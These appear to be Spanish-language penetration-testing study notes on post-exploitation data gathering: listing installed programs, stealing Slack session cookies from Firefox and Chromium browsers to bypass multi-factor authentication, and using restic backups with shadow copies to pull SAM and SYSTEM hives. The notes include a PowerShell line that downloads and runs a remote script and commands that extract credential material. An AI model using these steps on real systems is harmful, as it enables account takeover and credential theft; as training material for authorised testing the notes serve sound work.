
Proceso de obtener informacion de un sistema comprometido (info personal, planos, datos de tarjetas...)

## Fuentes de datos

Estas son fuentes de las que podemos obtener informacion de los sistemas comprometidos:

- Aplicaciones instaladas
- Servicios instalados
    - Sitios web
    - Recursos compartidos de archivos
    - Bases de datos
    - Servicios de Directorio (como Active Directory, Azure AD, etc.)
    - Servidores de Nombres
    - Servicios de Despliegue
    - Autoridad de Certificación
    - Servidor de Gestión de Código Fuente
    - Virtualización
    - Mensajería
    - Sistemas de Monitoreo y Registro
    - Copias de seguridad
- Datos Sensibles
    - Registro de pulsaciones de teclas (Keylogging)
    - Captura de pantalla
    - Captura de tráfico de red
    - Informes de auditorías anteriores
- Información del Usuario
    - Archivos de historial, documentos interesantes (.doc/x,.xls/x,password._/pass._, etc)
    - Roles y Privilegios
    - Navegadores Web
    - Clientes de Mensajería Instantánea

## Aplicaciones instaladas

Podemos encontrarnos con muchas aplicaciones desconocidas en los sistemas que comprometimos. Aprender y entender cómo estas aplicaciones se conectan con el negocio es esencial para lograr nuestro objetivo.

Podemos usar `dir` o `ls` en Program Files y Program Files (x86)

Otra opcion es usar PS para leer el registro Windows y recopilar informacion granular sobre los programas instaldos

```
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation

$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation

$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

```

## Abusando de Cookies para obtener acceso a clientes de mensajeria instantanea

Con la capacidad de enviar mensajes instantáneamente entre compañeros de trabajo y equipos, las aplicaciones de mensajería instantánea (IM) como `Slack` y `Microsoft Teams` se han convertido en elementos básicos de las comunicaciones

Existen múltiples opciones para obtener acceso a un cliente de mensajería instantánea; un método estándar es utilizar las credenciales del usuario para acceder a la versión en la nube de la aplicación

Si el usuario utiliza alguna forma de autenticación multifactor (multi-factor authentication), o no podemos obtener las credenciales del usuario en texto plano, podemos intentar robar las cookies

Usemos `Slack` como ejemplo. Hay una herramienta llamada [SlackExtract](https://github.com/clr2of8/SlackExtract) lanzada en 2018, que era capaz de extraer mensajes de `Slack`. Su investigación discute la cookie llamada `d`, que `Slack` utiliza para almacenar el token de autenticación del usuario. Si podemos conseguir esa cookie, podremos autenticarnos como el usuario. En lugar de usar la herramienta, intentaremos obtener la cookie de Firefox o de un navegador basado en Chromium y autenticarnos como el usuario


#### Extraccion de cookies desde Firefox

Firefox guarda las cookies en una base de datos SQLite en un archivo llamado `cookies.sqlite`

```
%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release
```

1. Copiar la BBDD

```
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

2. Extraer la cookie de Slack de la BBDD de cookies Firefox [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py)

```
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

3. Usando [Cookie-Editor](https://cookie-editor.cgagnier.ca/) añadimos la cookie

#### Extraccion de cookies en navegadores basados en Chromium

El navegador basado en Chromium también almacena su información de cookies en una base de datos SQLite. La única diferencia es que el valor de la cookie está cifrado con la [API de Protección de Datos (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)

Para obtener el valor de la cookie, necesitaremos realizar una rutina de descifrado desde la sesión del usuario que hemos comprometido. Afortunadamente, una herramienta [SharpChromium](https://github.com/djhohnstein/SharpChromium) hace lo que necesitamos

1. Usamos SharpChromium

```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')

Invoke-SharpChromium -Command "cookies slack.com"
```
![[Pasted image 20260913160247.png]]

	Nos da error porque donde esta buscando SharpChromium no esta el archivo. Podemos modificar el codigo o copiar el archivo donde lo esta buscando

- Esta buscando en:

```
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
```

- Realmente esta en:

```
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies
```

2. Copiamos las cookies en la ubicacion esperada:

```
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

3. Extraemos las cookies:

```
Invoke-SharpChromium -Command "cookies slack.com"
```
![[Pasted image 20260913160449.png]]

4. Hacemos lo mismo con Cookie-Editor


## Portapapeles

#### Atacando Servidores de Copias de Seguridad

Usemos [restic](https://restic.net/) como ejemplo. `Restic` es un programa de copia de seguridad moderno que puede hacer copias de seguridad de archivos en Linux, BSD, Mac y Windows.

Para empezar a trabajar con `restic`, debemos crear un `repositorio` (el directorio donde se almacenarán las copias de seguridad). `Restic` comprueba si la variable de entorno `RESTIC_PASSWORD` está establecida y utiliza su contenido como contraseña para el repositorio. Si esta variable no está establecida, pedirá la contraseña para inicializar el repositorio y para cualquier otra operación en este repositorio.

Usaremos `restic 0.13.1` y haremos una copia de seguridad del repositorio `C:\xampp\htdocs\webapp` en el directorio `E:\restic\`. Para descargar la última versión de restic, visita [https://github.com/restic/restic/releases/latest](https://github.com/restic/restic/releases/latest). En nuestra máquina objetivo, restic se encuentra en `C:\Windows\System32\restic.exe`.


1. Creamos e inicializamos la ubicacion donde se guarda nuestra copia de seguridad llamada repositorio:

```
mkdir E:\restic2; restic.exe -r E:\restic2 init
```
![[Pasted image 20260913160814.png]]

2. Creamos nuestra primera copia de seguridad:

```
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2\ backup C:\SampleFolder
```
![[Pasted image 20260913160847.png]]

- Si queremos hacer una copia de seguridad de un directorio como `C:\Windows`, que tiene algunos archivos utilizados activamente por el sistema operativo, podemos usar la opción `--use-fs-snapshot` para crear una VSS (Volume Shadow Copy) para realizar la copia de seguridad.

```
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
```
![[Pasted image 20260913160922.png]]

![[Pasted image 20260913160933.png]]

- Podemos verificar que copias hay en el repositorio:

```
restic.exe -r E:\restic2\ snapshots
```
![[Pasted image 20260913161005.png]]

- Restaurar copia de seguridad con ID

```
restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```
![[Pasted image 20260913161035.png]]

Si navegamos a `C:\Restore`, encontraremos la estructura de directorios donde se tomó la copia de seguridad. Para llegar al directorio `SampleFolder`, necesitamos navegar a `C:\Restore\C\SampleFolder`

	Si encontramos una copia de seguridad para una máquina Linux, es posible que queramos revisar archivos como `/etc/shadow` para crackear las credenciales de los usuarios, archivos de configuración web, directorios `.ssh` para buscar claves SSH, etc.


	Si estamos apuntando a una copia de seguridad de Windows, es posible que queramos buscar el hive de SAM y SYSTEM para extraer los hashes de las cuentas locales. También podemos identificar directorios de aplicaciones web y archivos comunes donde se almacenan credenciales o información sensible
